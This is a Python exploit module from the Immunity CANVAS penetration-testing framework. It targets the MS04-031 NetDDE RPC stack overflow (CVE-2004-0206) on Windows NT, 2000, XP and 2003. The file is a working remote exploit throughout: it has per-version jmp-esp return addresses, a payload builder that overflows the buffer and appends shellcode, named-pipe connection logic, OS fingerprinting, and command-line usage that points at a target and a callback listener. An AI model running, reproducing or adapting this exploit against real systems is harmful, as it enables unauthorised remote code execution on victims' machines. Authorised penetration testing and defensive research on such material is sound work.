#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import canvasengine
from msrpcexploit import msrpcexploit

# GUI info
NAME='Microsoft Windows NetDDE RPC Overflow'
DESCRIPTION='Microsoft Windows NetDDE RPC netdde.exe Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/12/04'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS04-031.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["CVE Name"] = "CVE-2004-0206"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0206"
DOCUMENTATION['CVSS'] = 7.5

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['MSADV']='MS04-031'

CHANGELOG="""
KK 01/24/07:
Rewritten
"""

NOTES="""
Tested on:
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Server SP4 Japanese OOTB
Windows 2000 Professional SP0 Simplified Chinese OOTB
Windows NT 4.0 Server SP6a French OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a English OOTB

Usage:
./exploits/ms04_031/ms04_031.py -v 0 -t 10.10.11.132 -l 10.10.11.1 -d 5555 -O user:user -O password:none
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

targets={
    0: ['Autoversioning',0],     
    1: ['Windows NT 4.0 SP6a',0x2b5028], #jmp esp #NOT WORKING DUE TO FRAGMENTION ISSUES
    2: ['Windows 2000 SP0-SP4',0x1f5028], #jmp esp
    3: ['Windows XP SP0-SP1a',0x225028], #jmp esp
    4: ['Windows 2003 SP0',0x42424242] #TODO #CANNOT CONNECT TO THE NAMED PIPE?
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.port           = 139
        self.host           = ''
        self.version        = 0
        self.badstring      = '\x00\xff'
        self.UUID           = u'2f5f3220-c126-1076-b549-074d078619da'
        self.uuidversion    = u'1.2'
        self.targetfunction = 0xc
        self.autoversion    = 1
        self.listenerArgsDict['fromcreatethread'] = 1

    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
                                            
    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))

    def testOS(self):
        self.getArgs()
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        devlog('ms04_031','target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if not os.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'% self.engine.osdetect_lang)
                os.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        self.log('version=%s'%(os.version))
        if os.version=='NT':
            self.log('Attacking Windows NT 4.0 language: %s'%(os.language))
            self.version=1
            return 1
        elif os.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(os.language))
            self.version=2
            return 1
        elif os.version=='XP':
            self.log('Attacking Windows XP language: %s'%(os.language))
            self.version=3
            return 1
        elif os.version=='2003':
            self.log('Attacking Windows 2003 language: %s'%(os.language))
            self.version=4
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.getArgs()
        self.connectionList=['ncacn_np:%s[\\nddeapi]'%(self.host)]
        return self.connectionList

    def buildDcePacket(self):
        self.log('version=%d'%(self.version))
        self.description,self.eip=targets[self.version]
        payload=''
        if self.version==1 or self.version==2 or self.version==3: #NT 4.0, 2000 and XP
            payload+='A'*0x212
            payload+=struct.pack('<L',self.eip)
            payload+='C'*0x8
            payload+=self.shellcode
        elif self.version==4: #2003
            payload+='A'*0x600
        if (len(payload)%2)==1:
            payload+='\x00'
        packet=''
        packet+=s_dce_raw_unistring(payload)
        packet+=struct.pack('<L',0)
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
